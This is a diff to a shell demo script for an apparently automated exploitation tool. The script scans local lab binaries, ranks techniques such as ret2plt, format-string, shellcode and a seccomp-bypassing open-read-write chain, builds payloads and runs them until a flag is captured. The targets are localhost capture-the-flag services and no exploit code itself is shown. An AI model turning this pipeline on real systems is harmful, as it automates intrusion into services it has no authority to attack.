@@ -7,7 +7,12 @@ cd "$(dirname "$0")/.."
 ROOT=$(pwd)
 
 WORK=$(mktemp -d)
-printf 'trail: demo-trail.jsonl\npacks: %s/../augure/packs\n' "$ROOT" >"$WORK/lictor.yml"
+if [ -d "$ROOT/augure/packs" ]; then
+	PACKS="$ROOT/augure/packs"
+else
+	PACKS="$ROOT/../augure/packs"
+fi
+printf 'trail: demo-trail.jsonl\npacks: %s\n' "$PACKS" >"$WORK/lictor.yml"
 
 L="$ROOT/bin/lictor"
 
@@ -21,7 +26,7 @@ echo "=== 1. scan (nmap finds the services, recorded in the trail) ==="
 # target:port  binary  (the binaries are served over http)
 STEP=2
 for entry in "127.0.0.1:9999 ret2func" "127.0.0.1:9998 ret2plt" \
-	"127.0.0.1:9997 shellcode" "127.0.0.1:9996 fmtstr"; do
+	"127.0.0.1:9997 shellcode" "127.0.0.1:9996 fmtstr" "127.0.0.1:9994 orw"; do
 	set -- $entry
 	TGT=$1
 	BIN=$2
@@ -37,20 +42,49 @@ for entry in "127.0.0.1:9999 ret2func" "127.0.0.1:9998 ret2plt" \
 		(cd "$WORK" && "$L" suggest target.facts 'vuln("fmtstr").
 fmtstr_read("true").' -o target.facts) | head -3
 	fi
+	if [ "$BIN" = shellcode ] || [ "$BIN" = orw ]; then
+		echo "[harvest] the service announces its own addresses -> leaked_address facts:"
+		(cd "$WORK" && "$L" harvest "$TGT" --facts target.facts) | head -3
+	fi
+	if [ "$BIN" = orw ]; then
+		echo "[decide] the source knowledge the profiler cannot see (execve dies under seccomp):"
+		(cd "$WORK" && "$L" suggest target.facts 'seccomp("true").' -o target.facts) | head -3
+	fi
 	echo "[decide] augure reads the facts and ranks the verified techniques:"
-	(cd "$WORK" && "$L" plan target.facts -s 7) | head -6
+	PLAN_OUT=$( (cd "$WORK" && "$L" plan target.facts -s 7) 2>&1)
+	echo "$PLAN_OUT" | head -6
 
-	echo "[build] the offset is MEASURED (cyclic pattern under the debugger):"
-	(cd "$WORK" && "$L" build "$BIN" --facts target.facts -o payload.bin -s 7) | head -4
+	echo "[build] the offset is MEASURED (cyclic pattern under the debugger);"
+	echo "[build] the build walks the ranking, the first buildable technique runs:"
+	rm -f "$WORK/payload.bin"
+	BUILD_EXTRA=""
+	[ "$BIN" = orw ] && BUILD_EXTRA="--shellcode-path /opt/target/orw.flag"
+	RANKED=$(printf '%s\n' "$PLAN_OUT" | sed -n -E 's/^(selected|ranking):[[:space:]]*//p' | tr '>' ' ' | tr -s '[:space:]' ' ')
+	RANKED=$(printf '%s\n' $RANKED | awk '!seen[$0]++' | tr '\n' ' ')
+	BUILT=""
+	for T in $RANKED; do
+		if BUILD_OUT=$( (cd "$WORK" && "$L" build "$BIN" --facts target.facts -o payload.bin -s 7 --technique "$T" $BUILD_EXTRA) 2>&1); then
+			BUILT=$T
+			echo "[build] the first buildable rank: $T"
+			echo "$BUILD_OUT" | head -4
+			break
+		fi
+		echo "[build] $T does not build from these facts, next rank"
+	done
 
 	echo "[run] the closed loop (the executor discovers the exploit in the repos):"
-	(cd "$WORK" && "$L" run "$TGT" --facts target.facts \
-		--executor ronin --payload payload.bin --max-attempts 2 -s 7 \
-		--flag-regex "FLAG\{[^}]+\}") | head -4
+	RUN_ARGS="--executor ronin --max-attempts 2 -s 7 --flag-regex FLAG\\{[^}]+\\}"
+	if [ -n "$BUILT" ]; then
+		RUN_ARGS="$RUN_ARGS --technique $BUILT"
+		if [ -f "$WORK/payload.bin" ]; then
+			RUN_ARGS="$RUN_ARGS --payload payload.bin"
+		fi
+	fi
+	(cd "$WORK" && "$L" run "$TGT" --facts target.facts $RUN_ARGS) | head -4
 done
 
 echo
-echo "=== 6. the heap target: the facts the PROFILER cannot see come from knowledge ==="
+echo "=== 7. the heap target: the facts the PROFILER cannot see come from knowledge ==="
 echo "[suggest] vuln(uaf) + tcache + glibc 36 -> the decision shifts:"
 (cd "$WORK" && "$L" acquire 127.0.0.1:9995 --from http://127.0.0.1:8000/uaf_heap >/dev/null)
 (cd "$WORK" && "$L" suggest target.facts 'vuln("uaf").
@@ -58,17 +92,6 @@ allocator("tcache").
 glibc_minor(36).
 function_pointer_on_heap("true").' -o target.facts) | head -3
 (cd "$WORK" && "$L" plan target.facts -s 7) | head -5
-
-echo
-echo "=== 7. the seccomp target: execve is dead, the orw chain is the answer ==="
-echo "[suggest] seccomp(true) -> the decision flips to the orw chain:"
-(cd "$WORK" && "$L" acquire 127.0.0.1:9994 --from http://127.0.0.1:8000/orw >/dev/null)
-(cd "$WORK" && "$L" suggest target.facts 'seccomp("true").' -o target.facts) | head -3
-echo "[harvest] the buffer leak -> leaked_address(input):"
-(cd "$WORK" && "$L" harvest 127.0.0.1:9994 --facts target.facts) | head -3
-(cd "$WORK" && "$L" plan target.facts -s 7) | head -5
-echo "[build] the orw stub (the flag path embedded), measured offset:"
-(cd "$WORK" && "$L" build orw --facts target.facts -o orw-payload.bin -s 7) | head -4
 
 echo
 echo "=== 8. the auditable engagement report (all six targets) ==="
